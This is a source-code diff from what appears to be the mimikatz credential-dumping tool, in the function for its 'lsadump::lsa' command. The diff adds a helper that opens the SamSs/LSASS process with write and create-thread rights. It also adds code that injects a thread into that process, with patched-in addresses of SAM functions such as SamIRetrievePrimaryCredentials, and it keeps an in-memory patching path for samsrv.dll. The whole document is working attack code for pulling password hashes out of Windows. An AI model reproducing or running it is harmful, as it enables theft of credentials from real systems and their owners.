@@ -9,7 +9,7 @@ const KUHL_M_C kuhl_m_c_lsadump[] = {
 	{kuhl_m_lsadump_sam,	L"sam",			L"Get the SysKey to decrypt SAM entries (from registry or hives)"},
 	{kuhl_m_lsadump_secrets,L"secrets",		L"Get the SysKey to decrypt SECRETS entries (from registry or hives)"},
 	{kuhl_m_lsadump_cache,	L"cache",		L"Get the SysKey to decrypt NL$KM then MSCache(v2) (from registry or hives)"},
-	{kuhl_m_lsadump_lsa,	L"lsa",			L"Ask LSA Server to retrieve SAM/AD entries (norma, patch on the fly or inject)"},
+	{kuhl_m_lsadump_lsa,	L"lsa",			L"Ask LSA Server to retrieve SAM/AD entries (normal, patch on the fly or inject)"},
 };
 
 const KUHL_M kuhl_m_lsadump = {
@@ -879,6 +879,7 @@ KULL_M_PATCH_GENERIC SamSrvReferences[] = {
 	{KULL_M_WIN_BUILD_8,		{sizeof(PTRN_WALL_SampQueryInformationUserInternal),	PTRN_WALL_SampQueryInformationUserInternal},	{sizeof(PATC_WALL_JmpShort),	PATC_WALL_JmpShort},	{-12}},
 };
 #endif
+PCWCHAR szSamSrv = L"samsrv.dll", szLsaSrv = L"lsasrv.dll", szNtDll = L"ntdll.dll", szKernel32 = L"kernel32.dll";
 NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 {
 	NTSTATUS status, enumStatus;
@@ -895,75 +896,68 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 	PUNICODE_STRING puName = NULL;
 	PDWORD pRid = NULL, pUse = NULL;
 
-	SERVICE_STATUS_PROCESS ServiceStatusProcess;
-	PKULL_M_MEMORY_HANDLE hMemory;
+	PKULL_M_MEMORY_HANDLE hMemory = NULL;
 	KULL_M_MEMORY_HANDLE hLocalMemory = {KULL_M_MEMORY_TYPE_OWN, NULL};
 	KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION iModuleSamSrv;
-	HANDLE hSamSs;
+	HANDLE hSamSs = NULL;
 	KULL_M_MEMORY_ADDRESS aPatternMemory = {NULL, &hLocalMemory}, aPatchMemory = {NULL, &hLocalMemory};
 	KULL_M_MEMORY_SEARCH sMemory;
 	PKULL_M_PATCH_GENERIC currentSamSrvReference;
 	
-	HANDLE hProcess = NULL;
-	PKULL_M_MEMORY_HANDLE hRemoteProc = NULL;
 	KULL_M_MEMORY_ADDRESS aRemoteFunc;
 	PKULL_M_MEMORY_ADDRESS aRemoteThread = NULL;
-	HMODULE maLib = NULL;
-
+	
 	static BOOL isPatching = FALSE;	
+
+	REMOTE_EXT extensions[] = {
+		{szSamSrv,	"SamIConnect",						(PVOID) 0x4141414141414141, NULL},
+		{szSamSrv,	"SamrCloseHandle",					(PVOID) 0x4242424242424242, NULL},
+		{szSamSrv,	"SamIRetrievePrimaryCredentials",	(PVOID) 0x4343434343434343, NULL},
+		{szSamSrv,	"SamrOpenDomain",					(PVOID) 0x4444444444444444, NULL},
+		{szSamSrv,	"SamrOpenUser",						(PVOID) 0x4545454545454545, NULL},
+		{szSamSrv,	"SamrQueryInformationUser",			(PVOID) 0x4646464646464646, NULL},
+		{szSamSrv,	"SamIFree_SAMPR_USER_INFO_BUFFER",	(PVOID) 0x4747474747474747, NULL},
+		{szLsaSrv,	"LsaIQueryInformationPolicyTrusted",(PVOID) 0x4848484848484848, NULL},
+		{szLsaSrv,	"LsaIFree_LSAPR_POLICY_INFORMATION",(PVOID) 0x4949494949494949, NULL},
+		{szKernel32,"VirtualAlloc",						(PVOID) 0x4a4a4a4a4a4a4a4a, NULL},
+		{szKernel32,"LocalFree",						(PVOID) 0x4b4b4b4b4b4b4b4b, NULL},
+		{szNtDll,	"memcpy",							(PVOID) 0x4c4c4c4c4c4c4c4c, NULL},
+	};
+	MULTIPLE_REMOTE_EXT extForCb = {sizeof(extensions) / sizeof(REMOTE_EXT), extensions};
+	
 	if(!isPatching && kull_m_string_args_byName(argc, argv, L"patch", NULL, NULL))
 	{
 		if(currentSamSrvReference = kull_m_patch_getGenericFromBuild(SamSrvReferences, sizeof(SamSrvReferences) / sizeof(KULL_M_PATCH_GENERIC), MIMIKATZ_NT_BUILD_NUMBER))
 		{
 			aPatternMemory.address = currentSamSrvReference->Search.Pattern;
 			aPatchMemory.address = currentSamSrvReference->Patch.Pattern;
-			if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
+
+			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION))
 			{
-				if(hSamSs = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, ServiceStatusProcess.dwProcessId))
+				if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"samsrv.dll", &iModuleSamSrv))
 				{
-					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hSamSs, &hMemory))
-					{
-						if(kull_m_process_getVeryBasicModuleInformationsForName(hMemory, L"samsrv.dll", &iModuleSamSrv))
-						{
-							sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
-							sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
-							isPatching = TRUE;
-							if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_lsa, argc, argv, NULL))
-								PRINT_ERROR_AUTO(L"kull_m_patch");
-							isPatching = FALSE;
-						}
-						else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
-						kull_m_memory_close(hMemory);
-					}
+					sMemory.kull_m_memoryRange.kull_m_memoryAdress = iModuleSamSrv.DllBase;
+					sMemory.kull_m_memoryRange.size = iModuleSamSrv.SizeOfImage;
+					isPatching = TRUE;
+					if(!kull_m_patch(&sMemory, &aPatternMemory, currentSamSrvReference->Search.Length, &aPatchMemory, currentSamSrvReference->Patch.Length, currentSamSrvReference->Offsets.off0, kuhl_m_lsadump_lsa, argc, argv, NULL))
+						PRINT_ERROR_AUTO(L"kull_m_patch");
+					isPatching = FALSE;
 				}
-				else PRINT_ERROR_AUTO(L"OpenProcess");
+				else PRINT_ERROR_AUTO(L"kull_m_process_getVeryBasicModuleInformationsForName");
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
 		}
 	}
 	else
 	{
 		if(!isPatching && kull_m_string_args_byName(argc, argv, L"inject", NULL, NULL))
 		{
-			if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
+			if(kuhl_m_lsadump_lsa_getHandle(&hMemory, PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION | PROCESS_CREATE_THREAD))
 			{
-				if(hProcess = OpenProcess(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, ServiceStatusProcess.dwProcessId))
-				{
-					if(kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, &hRemoteProc))
-					{
-						if(maLib = kull_m_remotelib_LoadLibrary(hRemoteProc, L"mimilib.dll"))
-						{
-							aRemoteFunc.hMemory = hRemoteProc;
-							aRemoteFunc.address = kull_m_remotelib_GetProcAddress(hRemoteProc, maLib, "samsrv");
-							aRemoteThread = &aRemoteFunc;
-						}
-					}
-				}
-				else PRINT_ERROR_AUTO(L"OpenProcess");
+				if(kull_m_remotelib_CreateRemoteCodeWitthPatternReplace(hMemory, kuhl_sekurlsa_samsrv_thread, (DWORD) ((PBYTE) kuhl_sekurlsa_samsrv_thread_end - (PBYTE) kuhl_sekurlsa_samsrv_thread), &extForCb, &aRemoteFunc))
+					aRemoteThread = &aRemoteFunc;
+				else PRINT_ERROR(L"kull_m_remotelib_CreateRemoteCodeWitthPatternReplace\n");
 			}
-			else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
 		}
-		
 		RtlZeroMemory(&objectAttributes, sizeof(LSA_OBJECT_ATTRIBUTES));
 		if(NT_SUCCESS(LsaOpenPolicy(NULL, &objectAttributes, POLICY_VIEW_LOCAL_INFORMATION, &hPolicy)))
 		{
@@ -1027,15 +1021,38 @@ NTSTATUS kuhl_m_lsadump_lsa(int argc, wchar_t * argv[])
 			LsaClose(hPolicy);
 		}
 
-		if(maLib)
-			kull_m_remotelib_FreeLibrary(hRemoteProc, maLib);
-		if(hRemoteProc)
-			kull_m_memory_close(hRemoteProc);
-		if(hProcess)
-			CloseHandle(hProcess);
+		if(aRemoteThread)
+			kull_m_memory_free(aRemoteThread, 0);
+	}
+
+	if(hMemory)
+	{
+		if(hMemory->pHandleProcess->hProcess)
+			CloseHandle(hMemory->pHandleProcess->hProcess);
+		kull_m_memory_close(hMemory);
 	}
 	return status;
 }
+
+BOOL kuhl_m_lsadump_lsa_getHandle(PKULL_M_MEMORY_HANDLE * hMemory, DWORD Flags)
+{
+	BOOL success = FALSE;
+	SERVICE_STATUS_PROCESS ServiceStatusProcess;
+	HANDLE hProcess;
+
+	if(kull_m_service_getUniqueForName(L"SamSs", &ServiceStatusProcess))
+	{
+		if(hProcess = OpenProcess(Flags, FALSE, ServiceStatusProcess.dwProcessId))
+		{
+			if(!(success = kull_m_memory_open(KULL_M_MEMORY_TYPE_PROCESS, hProcess, hMemory)))
+				CloseHandle(hProcess);
+		}
+		else PRINT_ERROR_AUTO(L"OpenProcess");
+	}
+	else PRINT_ERROR_AUTO(L"kull_m_service_getUniqueForName");
+	return success;
+}
+
 
 void kuhl_m_lsadump_lsa_user(SAMPR_HANDLE DomainHandle, DWORD rid, PUNICODE_STRING name, PKULL_M_MEMORY_ADDRESS aRemoteThread)
 {
